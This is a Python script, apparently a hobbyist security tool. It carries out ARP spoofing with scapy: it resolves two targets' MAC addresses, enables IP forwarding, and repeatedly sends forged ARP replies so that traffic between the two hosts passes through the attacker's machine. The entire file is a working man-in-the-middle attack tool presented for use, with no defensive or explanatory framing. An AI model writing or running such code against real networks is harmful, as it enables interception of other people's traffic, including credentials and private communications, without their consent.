#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time
import subprocess
import sys

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t1", "--target1", dest="targetIP1", help="Enter an IP Address to spoof with the -t1 option.")
    parser.add_argument("-t2", "--target2", dest="targetIP2", help="Enter a second IP Address to spoofwith the -t2 option.")
    (options) = parser.parse_args()
    return options


def getMAC(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1)[0]
    return answered_list[0][1].hwsrc


def send_ARP_packet(targetIP, targetMAC, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(packet)


def enableIPforwarding():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def packetLoop():
    options = getArguments()
    targetIP1 = options.targetIP1
    targetIP2 = options.targetIP2

    try:
        targetMAC1 = getMAC(targetIP1)
    except:
        print("[-] Please input a valid IP address for target 1 with the -t1 option.")
        sys.exit()

    try:
        targetMAC2 = getMAC(targetIP2)
    except:
        print("[-] Please input a valid IP address for target 2 with the -t2 option.")
        sys.exit()

    while True:
        send_ARP_packet(targetIP1, targetMAC1, targetIP2)
        print("[+] A packet was sent to target IP: " + targetIP1)
        send_ARP_packet(targetIP2, targetMAC2, targetIP1)
        print("[+] A packet was sent to target IP: " + targetIP2)
        time.sleep(2)


def main():
    booleanInput = input("Have you enabled IP forwarding? Input yes or no: ")
    if booleanInput == "y" or booleanInput == "yes":
        packetLoop()
    elif booleanInput == "n" or booleanInput == "no":
        enableIPforwarding()
        print("[+] We have enabled IP forwarding for you.\n")
        print("[+] The code will run in 5 seconds.")
        time.sleep(5)
        packetLoop()
    else:
        print("Please provide a valid input.")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
